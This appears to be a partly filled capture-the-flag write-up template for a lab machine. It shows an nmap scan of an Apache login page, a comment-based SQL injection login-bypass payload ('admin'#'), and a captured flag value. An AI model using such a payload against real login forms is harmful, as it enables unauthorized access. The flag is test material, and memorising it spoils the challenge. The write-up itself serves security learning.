# Machine Name

- Platform:
- Difficulty:
- Date: 
- IP: 10.x.x.x

# Enumeration

## Nmap

```bash
nmap -sC -sV $IP -oN recon/initial
```

### Findings

```
# Nmap 7.98 scan initiated Sun May 24 10:58:45 2026 as: /usr/lib/nmap/nmap --privileged -sV -sC -oN recon/initial 10.129.13.127
Nmap scan report for 10.129.13.127
Host is up (0.20s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Login
|_http-server-header: Apache/2.4.38 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 24 10:59:01 2026 -- 1 IP address (1 host up) scanned in 16.09 seconds
```
Notes:
- Port 80 Apache
- Visiting IP in web browser gives us a basic login page
- No errors returned when attempting random creds (example, admin:admin)

---

# Initial Foothold

## Vulnerability

Task 10 asks us: If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned?

## Exploit

```text
admin'#:password
```

---

# Flags

## Root

```text
Congratulations!
e3d0796d002a446c0e622226f42e9672
```

---

# Lessons Learned

- Key takeaway
- Enumeration lesson
- Missed clues: Didn't read tasks thoroughly and missed next step for exploitation.
- New/Useful Commands or Techniques: Testing SQL Injection on Front-end site.
